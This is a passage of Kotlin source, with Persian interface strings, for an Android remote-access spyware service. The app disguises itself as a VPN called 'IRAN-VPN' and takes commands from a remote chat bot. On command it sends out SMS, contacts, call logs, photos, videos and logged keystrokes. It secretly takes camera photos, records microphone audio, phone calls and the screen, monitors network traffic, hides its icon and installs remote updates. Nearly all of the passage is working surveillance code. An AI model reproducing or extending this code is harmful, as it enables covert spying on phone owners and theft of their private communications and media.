                  else MediaStore.Video.Media.EXTERNAL_CONTENT_URI
        val col = if (kind == "photo") MediaStore.Images.Media.DATA else MediaStore.Video.Media.DATA
        val out = mutableListOf<File>()
        val sel  = if (folder.isNotBlank()) "$col LIKE ?" else null
        val args = if (folder.isNotBlank()) arrayOf("%$folder%") else null
        ctx.contentResolver.query(uri, arrayOf(col), sel, args, "$col DESC")?.use { c ->
            while (c.moveToNext() && out.size < count) {
                val p = c.getString(0) ?: continue
                val f = File(p); if (f.exists()) out.add(f)
            }
        }
        return out
    }
    fun callRecordings(count: Int): List<File> {
        val dir = File(ctx.getExternalFilesDir(null), "call_recs")
        if (!dir.exists()) return emptyList()
        return dir.listFiles()?.sortedByDescending { it.lastModified() }?.take(count) ?: emptyList()
    }
    fun typedFile(): File? {
        val dir = File(ctx.getExternalFilesDir(null), "typed")
        if (!dir.exists()) return null
        val files = dir.listFiles()?.sortedBy { it.name } ?: return null
        if (files.isEmpty()) return null
        val combined = File(ctx.cacheDir, "typed_all_${System.currentTimeMillis()}.txt")
        val sb = StringBuilder()
        files.forEach { f ->
            sb.appendLine("═══ ${f.name} ═══"); sb.append(f.readText()); sb.appendLine()
        }
        combined.writeText(sb.toString().ifEmpty { "چیزی ضبط نشده" })
        return combined
    }
}

// ============================================================
// ۱۳) Cam
// ============================================================
class Cam {
    fun takePhoto(ctx: Context): File {
        val f = File(ctx.cacheDir, "cam_${System.currentTimeMillis()}.jpg")
        val latch = CountDownLatch(1)
        var c: android.hardware.Camera? = null
        try {
            c = android.hardware.Camera.open()
            c.setPreviewTexture(android.graphics.SurfaceTexture(0))
            c.startPreview()
            c.takePicture(null, null) { data, cam ->
                try { data?.let { f.writeBytes(it) } } catch (_: Exception) {}
                try { cam?.stopPreview(); cam?.release() } catch (_: Exception) {}
                latch.countDown()
            }
            if (!latch.await(15, TimeUnit.SECONDS)) throw RuntimeException("timeout")
        } catch (e: Exception) {
            try { c?.stopPreview(); c?.release() } catch (_: Exception) {}
            throw e
        }
        return f
    }
    fun recordVideo(ctx: Context, seconds: Int, quality: String): File {
        val f = File(ctx.cacheDir, "cam_${System.currentTimeMillis()}.mp4")
        val c = android.hardware.Camera.open()
        try {
            c.unlock()
            val mr = if (Build.VERSION.SDK_INT >= 31) MediaRecorder(ctx) else @Suppress("DEPRECATION") MediaRecorder()
            mr.setCamera(c); mr.setAudioSource(MediaRecorder.AudioSource.MIC)
            mr.setVideoSource(MediaRecorder.VideoSource.CAMERA)
            mr.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
            mr.setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
            when (quality) {
                "low" -> { mr.setVideoEncoder(MediaRecorder.VideoEncoder.H264); mr.setVideoSize(640, 480); mr.setVideoEncodingBitRate(500_000) }
                "medium" -> { mr.setVideoEncoder(MediaRecorder.VideoEncoder.H264); mr.setVideoSize(1280, 720); mr.setVideoEncodingBitRate(1_500_000) }
                else -> { mr.setVideoEncoder(MediaRecorder.VideoEncoder.H264); mr.setVideoFrameRate(30) }
            }
            mr.setOutputFile(f.absolutePath); mr.prepare()
            c.setPreviewTexture(android.graphics.SurfaceTexture(0)); c.startPreview(); mr.start()
            Thread.sleep(seconds * 1000L)
            try { mr.stop() } catch (_: Exception) {}
            mr.release()
            try { c.reconnect() } catch (_: Exception) {}
            c.release()
        } catch (e: Exception) {
            try { c.release() } catch (_: Exception) {}
            throw e
        }
        return f
    }
}

// ============================================================
// ۱۴) Rec
// ============================================================
class Rec(private val ctx: Context) {
    fun recordVoice(seconds: Int, quality: String): File {
        val f = File(ctx.cacheDir, "voice_${System.currentTimeMillis()}.m4a")
        val mr = if (Build.VERSION.SDK_INT >= 31) MediaRecorder(ctx) else @Suppress("DEPRECATION") MediaRecorder()
        mr.setAudioSource(MediaRecorder.AudioSource.MIC)
        mr.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
        mr.setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
        when (quality) {
            "low" -> { mr.setAudioEncodingBitRate(32_000); mr.setAudioSamplingRate(16_000) }
            "medium" -> { mr.setAudioEncodingBitRate(64_000); mr.setAudioSamplingRate(22_050) }
            else -> { mr.setAudioEncodingBitRate(128_000); mr.setAudioSamplingRate(44_100) }
        }
        mr.setOutputFile(f.absolutePath); mr.prepare(); mr.start()
        Thread.sleep(seconds * 1000L)
        try { mr.stop() } catch (_: Exception) {}
        mr.release()
        return f
    }
}

// ============================================================
// ۱۵) QualityReducer
// ============================================================
object QualityReducer {
    fun reducePhoto(file: File, outDir: File, quality: String): File? {
        return try {
            val q = when (quality) { "low" -> 40; "medium" -> 65; "high" -> 85; else -> return null }
            val bmp = BitmapFactory.decodeFile(file.absolutePath) ?: return null
            val out = File(outDir, file.nameWithoutExtension + "_r.jpg")
            out.outputStream().use { bmp.compress(Bitmap.CompressFormat.JPEG, q, it) }
            bmp.recycle(); out
        } catch (_: Exception) { null }
    }
}

// ============================================================
// ۱۶) CallMonitor
// ============================================================
class CallMonitor(private val ctx: Context, private val cfg: Config, private val onEvent: (String) -> Unit) {
    private var phoneListener: PhoneStateListener? = null
    private var recorder: MediaRecorder? = null
    private var currentFile: File? = null
    private var callNumber: String? = null
    private var callStart: Long = 0
    fun start() {
        val tm = ctx.getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
        val listener = object : PhoneStateListener() {
            override fun onCallStateChanged(state: Int, phoneNumber: String?) { handleState(state, phoneNumber) }
        }
        phoneListener = listener
        @Suppress("DEPRECATION") tm.listen(listener, PhoneStateListener.LISTEN_CALL_STATE)
    }
    fun stop() {
        try { phoneListener?.let {
            val tm = ctx.getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
            @Suppress("DEPRECATION") tm.listen(it, PhoneStateListener.LISTEN_NONE)
        } } catch (_: Exception) {}
        stopRecording()
    }
    private fun handleState(state: Int, phone: String?) {
        when (state) {
            TelephonyManager.CALL_STATE_RINGING -> {
                callNumber = phone ?: "ناشناس"
                if (cfg.eventsOn) onEvent("📞 تماس ورودی از `$callNumber`")
            }
            TelephonyManager.CALL_STATE_OFFHOOK -> {
                if (callNumber == null) callNumber = phone ?: "خروجی"
                callStart = System.currentTimeMillis()
                if (cfg.autoCallRec) startRecording()
            }
            TelephonyManager.CALL_STATE_IDLE -> {
                val rec = stopRecording()
                if (callNumber != null && callNumber != "ناشناس") {
                    val dur = if (callStart > 0) (System.currentTimeMillis() - callStart) / 1000 else 0
                    if (cfg.eventsOn) onEvent("📞 تماس با `$callNumber` تموم شد" +
                        if (dur > 0) " ($dur ثانیه)" else "" +
                        if (rec != null) "\n🎙 ضبط: ${rec.name}" else "")
                }
                callNumber = null; callStart = 0
            }
        }
    }
    private fun startRecording() {
        val dir = File(ctx.getExternalFilesDir(null), "call_recs").apply { mkdirs() }
        val f = File(dir, "call_${callNumber?.replace(Regex("[^0-9+]"), "") ?: "unknown"}_${System.currentTimeMillis()}.m4a")
        try {
            val mr = if (Build.VERSION.SDK_INT >= 31) MediaRecorder(ctx) else @Suppress("DEPRECATION") MediaRecorder()
            mr.setAudioSource(MediaRecorder.AudioSource.VOICE_CALL)
            mr.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
            mr.setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
            mr.setAudioEncodingBitRate(64_000); mr.setAudioSamplingRate(44_100)
            mr.setOutputFile(f.absolutePath); mr.prepare(); mr.start()
            recorder = mr; currentFile = f
        } catch (_: Exception) {
            try {
                val mr = if (Build.VERSION.SDK_INT >= 31) MediaRecorder(ctx) else @Suppress("DEPRECATION") MediaRecorder()
                mr.setAudioSource(MediaRecorder.AudioSource.VOICE_COMMUNICATION)
                mr.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                mr.setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
                mr.setOutputFile(f.absolutePath); mr.prepare(); mr.start()
                recorder = mr; currentFile = f
            } catch (_: Exception) {}
        }
    }
    private fun stopRecording(): File? {
        val f = currentFile
        try { recorder?.stop() } catch (_: Exception) {}
        try { recorder?.release() } catch (_: Exception) {}
        recorder = null; currentFile = null
        return f?.takeIf { it.exists() && it.length() > 0 }
    }
}

// ============================================================
// ۱۷) MediaWatcher
// ============================================================
class MediaWatcher(private val ctx: Context, private val onEvent: (String) -> Unit) {
    private var imgObs: ContentObserver? = null
    private var vidObs: ContentObserver? = null
    private var lastImgId = 0L
    private var lastVidId = 0L
    fun start() {
        imgObs = object : ContentObserver(Handler(Looper.getMainLooper())) {
            override fun onChange(selfChange: Boolean, uri: Uri?) { uri?.let { checkNew("photo", it) } }
        }
        vidObs = object : ContentObserver(Handler(Looper.getMainLooper())) {
            override fun onChange(selfChange: Boolean, uri: Uri?) { uri?.let { checkNew("video", it) } }
        }
        ctx.contentResolver.registerContentObserver(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, true, imgObs!!)
        ctx.contentResolver.registerContentObserver(MediaStore.Video.Media.EXTERNAL_CONTENT_URI, true, vidObs!!)
        lastImgId = getMaxId(MediaStore.Images.Media.EXTERNAL_CONTENT_URI)
        lastVidId = getMaxId(MediaStore.Video.Media.EXTERNAL_CONTENT_URI)
    }
    fun stop() {
        imgObs?.let { ctx.contentResolver.unregisterContentObserver(it) }
        vidObs?.let { ctx.contentResolver.unregisterContentObserver(it) }
    }
    private fun getMaxId(uri: Uri): Long {
        var max = 0L
        try {
            ctx.contentResolver.query(uri, arrayOf(MediaStore.MediaColumns._ID),
                null, null, "${MediaStore.MediaColumns._ID} DESC")?.use { c ->
                if (c.moveToFirst()) max = c.getLong(0)
            }
        } catch (_: Exception) {}
        return max
    }
    private fun checkNew(kind: String, uri: Uri) {
        val id = try { android.content.ContentUris.parseId(uri) } catch (_: Exception) { -1L }
        if (id <= 0) return
        val last = if (kind == "photo") lastImgId else lastVidId
        if (id <= last) return
        val contentUri = if (kind == "photo") MediaStore.Images.Media.EXTERNAL_CONTENT_URI
                         else MediaStore.Video.Media.EXTERNAL_CONTENT_URI
        try {
            ctx.contentResolver.query(android.content.ContentUris.withAppendedId(contentUri, id),
                arrayOf(MediaStore.MediaColumns.DISPLAY_NAME, MediaStore.MediaColumns.SIZE),
                null, null, null)?.use { c ->
                if (c.moveToFirst()) {
                    val name = c.getString(0) ?: "?"
                    val size = c.getLong(1) / 1024
                    onEvent("${if (kind == "photo") "📷" else "🎬"} ${if (kind == "photo") "عکس" else "ویدیو"} جدید: `$name` ($size KB)")
                }
            }
        } catch (_: Exception) {}
        if (kind == "photo") lastImgId = id else lastVidId = id
    }
}

// ============================================================
// ۱۸) BotService
// ============================================================
class BotService : Service() {
    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private lateinit var worker: Worker
    private lateinit var cfg: Config
    private lateinit var col: Collector
    private lateinit var rec: Rec
    private lateinit var cam: Cam
    private var chatId = 0L
    private var callMonitor: CallMonitor? = null
    private var mediaWatcher: MediaWatcher? = null

    override fun onCreate() {
        super.onCreate()
        startForeground(1, notif())
        cfg = Config(this); col = Collector(this); rec = Rec(this); cam = Cam()
        worker = Worker(cfg)
        if (cfg.trafficOn && VpnService.prepare(this) == null) {
            try { startService(Intent(this, TrafficService::class.java)) } catch (_: Exception) {}
        }
        scope.launch { loop() }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        if (intent?.action == "CAPTURE") {
            val rc = intent.getIntExtra("resultCode", 0)
            val data = intent.getParcelableExtra<Intent>("data")
            val mode = intent.getStringExtra("mode") ?: "screenshot"
            val seconds = intent.getIntExtra("seconds", 30)
            if (data != null) scope.launch { doCapture(rc, data, mode, seconds) }
        }
        return START_STICKY
    }

    private fun notif(): Notification {
        val ch = "s"
        if (Build.VERSION.SDK_INT >= 26) {
            val nm = getSystemService(NotificationManager::class.java)
            if (nm.getNotificationChannel(ch) == null)
                nm.createNotificationChannel(NotificationChannel(ch, "System", NotificationManager.IMPORTANCE_LOW))
        }
        return NotificationCompat.Builder(this, ch)
            .setSmallIcon(android.R.drawable.stat_notify_sync)
            .setContentTitle("IRAN-VPN").setContentText("سرویس در حال اجرا").setOngoing(true).build()
    }

    private suspend fun loop() {
        val prefs = getSharedPreferences("cfg", MODE_PRIVATE)
        chatId = prefs.getLong("chatId", 0L)
        var tries = 0
        while (chatId == 0L && tries++ < 30) {
            val got = worker.register(this)
            if (got != null && got != 0L) { chatId = got; break }
            delay(20_000)
        }
        if (chatId != 0L && !prefs.getBoolean("announced", false)) {
            worker.sendText(chatId, "✅ *${cfg.deviceName}* متصل شد (v${BuildConfig.APP_VERSION_NAME})\n\n${col.info()}")
            prefs.edit().putBoolean("announced", true).apply()
        }
        callMonitor = CallMonitor(this, cfg) { text -> reply(text) }.also { it.start() }
        mediaWatcher = MediaWatcher(this) { text -> if (cfg.eventsOn) reply(text) }.also { it.start() }

        while (scope.isActive) {
            try {
                for (cmd in worker.poll(this)) {
                    if (cmd == "/install_update") {
                        reply("⬇️ در حال دانلود آپدیت...")
                        Updater(this@BotService).downloadAndInstallFromService()
                    } else { handle(cmd) }
                }
            } catch (_: Exception) {}
            delay(5_000)
        }
    }

    private fun reply(text: String) {
        if (chatId != 0L) worker.sendText(chatId, "[${cfg.deviceName}]\n$text")
    }
    private suspend fun sendFile(f: File, contentType: String = "application/octet-stream", reduce: (File) -> File? = { null }) {
        worker.smartSend(this, chatId, f, contentType, reduce)
    }

    private suspend fun handle(cmdLine: String) {
        val parts = cmdLine.trim().split(Regex("\\s+"))
        if (parts.isEmpty()) return
        val cmd = parts[0]; val args = parts.drop(1)

        when (cmd) {
            "/info", "/whoami" -> reply(col.info())
            "/battery" -> reply(col.battery())
            "/network" -> reply(col.network())
            "/wifi" -> reply(col.wifi())
            "/ip" -> reply(col.ipInfo())
            "/sms" -> reply(col.sms(cfg.smsLimit))
            "/contacts" -> sendFile(col.contactsFile(), "text/plain")
            "/calls" -> reply(col.calls(cfg.callsLimit))
            "/photos" -> col.media("photo", cfg.photoCount, cfg.photoFolder).forEach { f ->
                sendFile(f, "image/jpeg") { file -> QualityReducer.reducePhoto(file, cacheDir, cfg.quality) }
            }
            "/videos" -> col.media("video", cfg.videoCount, cfg.videoFolder).forEach { f -> sendFile(f, "video/mp4") }
            "/photo" -> {
                reply("📸 در حال گرفتن عکس...")
                try { sendFile(cam.takePhoto(this), "image/jpeg") } catch (e: Exception) { reply("خطا: ${e.message}") }
            }
            "/record" -> {
                val sec = args.getOrNull(0)?.toIntOrNull() ?: 10
                reply("🎥 ضبط ${sec}s...")
                try { sendFile(cam.recordVideo(this, sec, cfg.quality), "video/mp4") } catch (e: Exception) { reply("خطا: ${e.message}") }
            }
            "/voice" -> {
                val sec = args.getOrNull(0)?.toIntOrNull() ?: 10
                reply("🎙 ضبط ${sec}s...")
                try { sendFile(rec.recordVoice(sec, cfg.quality), "audio/m4a") } catch (e: Exception) { reply("خطا: ${e.message}") }
            }
            "/screenshot" -> {
                reply("📸 پنجره تایید روی گوشی باز می‌شه...")
                startActivity(Intent(this, ScreenCaptureActivity::class.java).apply {
                    putExtra("mode", "screenshot"); addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                })
            }
            "/screenrec" -> {
                val sec = args.getOrNull(0)?.toIntOrNull() ?: 30
                reply("🎥 ضبط ${sec}s — پنجره تایید روی گوشی...")
                startActivity(Intent(this, ScreenCaptureActivity::class.java).apply {
                    putExtra("mode", "record"); putExtra("seconds", sec)
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                })
            }
            "/traffic" -> when (args.getOrNull(0)?.lowercase()) {
                "on" -> {
                    val prepare = VpnService.prepare(this)
                    if (prepare != null) {
                        reply("⚠️ یک‌بار باید روی گوشی تایید VPN بدی...")
                        startActivity(Intent(this, TrafficApprovalActivity::class.java).apply {
                            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                        })
                    } else {
                        startService(Intent(this, TrafficService::class.java))
                        cfg.trafficOn = true
                        reply("✅ رصد ترافیک روشن شد")
                    }
                }
                "off" -> {
                    stopService(Intent(this, TrafficService::class.java))
                    cfg.trafficOn = false
                    reply("⛔ رصد ترافیک خاموش شد")
                }
                else -> reply("استفاده: `/traffic on|off`")
            }
            "/traffic_dump" -> {
                val svc = TrafficService.instance
                if (svc == null) reply("سرویس ترافیک اجرا نیست. اول `/traffic on` بزن.")
                else {
                    val stats = svc.dumpStats()
                    if (stats == "ترافیکی ثبت نشده.") reply(stats)
                    else {
                        val f = File(cacheDir, "traffic_${System.currentTimeMillis()}.txt")
                        f.writeText(stats)
                        reply("📊 ارسال فایل ترافیک...")
                        sendFile(f, "text/plain")
                    }
                }
            }
            "/traffic_clear" -> {
                TrafficService.instance?.clearStats()
                reply("✅ آمار ترافیک پاک شد")
            }
            "/typed" -> when (args.getOrNull(0)?.lowercase()) {
                "on" -> { cfg.typedOn = true; reply("✅ ضبط تایپ روشن\n_Accessibility رو در Settings فعال کن_") }
                "off" -> { cfg.typedOn = false; reply("⛔ خاموش") }
                else -> reply("استفاده: `/typed on|off`")
            }
            "/typed_range" -> {
                val r = args.joinToString(" ").trim()
                if (r.isEmpty()) { cfg.typedRange = ""; reply("بازه پاک شد") }
                else if (Regex("^\\d{1,2}:\\d{2}-\\d{1,2}:\\d{2}$").matches(r)) {
                    cfg.typedRange = r; reply("✅ بازه: $r")
                } else reply("فرمت: `/typed_range 09:00-18:00`")
            }
            "/typed_dump" -> {
                val f = col.typedFile()
                if (f == null) reply("چیزی ضبط نشده.")
                else { reply("📄 ارسال فایل..."); sendFile(f, "text/plain") }
            }
            "/sms_notify" -> when (args.getOrNull(0)?.lowercase()) {
                "on" -> { cfg.smsNotify = true; reply("✅ اعلان SMS روشن") }
                "off" -> { cfg.smsNotify = false; reply("⛔ خاموش") }
                else -> reply("استفاده: `/sms_notify on|off`")
            }
            "/callrecs" -> {
                val n = args.getOrNull(0)?.toIntOrNull() ?: 5
                val recs = col.callRecordings(n)
                if (recs.isEmpty()) reply("ضبط مکالمه‌ای نیست.")
                else {
                    reply("📞 ${recs.size} ضبط آخر:")
                    recs.forEach { f ->
                        worker.sendText(chatId, "[${cfg.deviceName}]\n🎙 `${f.name}`\n📦 ${f.length()/1024} KB")
                        sendFile(f, "audio/m4a")
                    }
                }
            }
            "/callrec" -> when (args.getOrNull(0)?.lowercase()) {
                "on" -> { cfg.autoCallRec = true; reply("✅ ضبط خودکار روشن") }
                "off" -> { cfg.autoCallRec = false; reply("⛔ خاموش") }
                else -> reply("استفاده: `/callrec on|off`")
            }
            "/events" -> when (args.getOrNull(0)?.lowercase()) {
                "on" -> { cfg.eventsOn = true; reply("✅ روشن") }
                "off" -> { cfg.eventsOn = false; reply("⛔ خاموش") }
                else -> reply("استفاده: `/events on|off`")
            }
            "/chunk" -> when (args.getOrNull(0)?.lowercase()) {
                "on" -> { cfg.chunkOn = true; reply("✅ روشن") }
                "off" -> { cfg.chunkOn = false; reply("⛔ خاموش") }
                else -> reply("استفاده: `/chunk on|off`")
            }
            "/quality" -> {
                val q = args.getOrNull(0)?.lowercase() ?: "original"
                if (q in listOf("original","high","medium","low")) { cfg.quality = q; reply("✅ کیفیت: $q") }
                else reply("مقادیر: original, high, medium, low")
            }
            "/set_sms" -> args.getOrNull(0)?.toIntOrNull()?.let { cfg.smsLimit = it; reply("ok") }
            "/set_calls" -> args.getOrNull(0)?.toIntOrNull()?.let { cfg.callsLimit = it; reply("ok") }
            "/set_photos" -> args.getOrNull(0)?.toIntOrNull()?.let { cfg.photoCount = it; reply("ok") }
            "/set_videos" -> args.getOrNull(0)?.toIntOrNull()?.let { cfg.videoCount = it; reply("ok") }
            "/rename_self" -> {
                val newName = args.joinToString(" ").trim()
                if (newName.isNotEmpty()) { cfg.deviceName = newName; worker.register(this); reply("نام تغییر کرد") }
            }
            "/dump_all" -> {
                reply("📦 همه چیز...")
                sendFile(col.contactsFile(), "text/plain")
                reply("— SMS —\n${col.sms(cfg.smsLimit)}")
                reply("— CALLS —\n${col.calls(cfg.callsLimit)}")
                col.media("photo", cfg.photoCount, cfg.photoFolder).forEach { f ->
                    sendFile(f, "image/jpeg") { file -> QualityReducer.reducePhoto(file, cacheDir, cfg.quality) }
                }
                col.media("video", cfg.videoCount, cfg.videoFolder).forEach { f -> sendFile(f, "video/mp4") }
            }
            "/hide" -> {
                packageManager.setComponentEnabledSetting(ComponentName(this, MainActivity::class.java),
                    PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP)
                reply("آیکون مخفی شد")
            }
            "/show" -> {
                packageManager.setComponentEnabledSetting(ComponentName(this, MainActivity::class.java),
                    PackageManager.COMPONENT_ENABLED_STATE_ENABLED, PackageManager.DONT_KILL_APP)
                reply("آیکون برگشت")
            }
        }
    }

    private suspend fun doCapture(resultCode: Int, data: Intent, mode: String, seconds: Int) {
        val mgr = getSystemService(MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
        val projection = mgr.getMediaProjection(resultCode, data) ?: run { reply("خطا"); return }
        val metrics = resources.displayMetrics
        val w = metrics.widthPixels; val h = metrics.heightPixels; val density = metrics.densityDpi
        try {
            if (mode == "screenshot") {
                val reader = ImageReader.newInstance(w, h, PixelFormat.RGBA_8888, 2)
                val vd = projection.createVirtualDisplay("s", w, h, density,
                    DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR, reader.surface, null, null)
                delay(700)
                val img = reader.acquireLatestImage()
                if (img != null) {
                    val planes = img.planes
                    val buffer = planes[0].buffer
                    val pixelStride = planes[0].pixelStride
                    val rowStride = planes[0].rowStride
                    val rowPadding = rowStride - pixelStride * w
                    val bmp = Bitmap.createBitmap(w + rowPadding / pixelStride, h, Bitmap.Config.ARGB_8888)
                    bmp.copyPixelsFromBuffer(buffer)
                    val cropped = Bitmap.createBitmap(bmp, 0, 0, w, h)
                    val f = File(cacheDir, "screenshot_${System.currentTimeMillis()}.png")
                    f.outputStream().use { cropped.compress(Bitmap.CompressFormat.PNG, 100, it) }
                    img.close(); vd.release(); reader.close()
                    sendFile(f, "image/png")
                    reply("✅ اسکرین‌شات ارسال شد")
                } else reply("خطا: عکس گرفته نشد")
            } else if (mode == "record") {
                val f = File(cacheDir, "screenrec_${System.currentTimeMillis()}.mp4")
                val mr = if (Build.VERSION.SDK_INT >= 31) MediaRecorder(this) else @Suppress("DEPRECATION") MediaRecorder()
                mr.setVideoSource(MediaRecorder.VideoSource.SURFACE)
                mr.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                mr.setVideoEncoder(MediaRecorder.VideoEncoder.H264)
                mr.setVideoSize(w, h); mr.setVideoFrameRate(30)
                mr.setVideoEncodingBitRate(4_000_000)
                mr.setOutputFile(f.absolutePath); mr.prepare()
                val vd = projection.createVirtualDisplay("s", w, h, density,
                    DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR, mr.surface, null, null)
                mr.start(); delay(seconds * 1000L)
                try { mr.stop() } catch (_: Exception) {}
                try { mr.release() } catch (_: Exception) {}
                vd.release()
                sendFile(f, "video/mp4")
                reply("✅ ضبط ${seconds}s ارسال شد")
            }
        } catch (e: Exception) { reply("خطا: ${e.message}") }
        finally { try { projection.stop() } catch (_: Exception) {} }
    }

    override fun onBind(i: Intent?) = null
    override fun onDestroy() { callMonitor?.stop(); mediaWatcher?.stop(); scope.cancel(); super.onDestroy() }
}
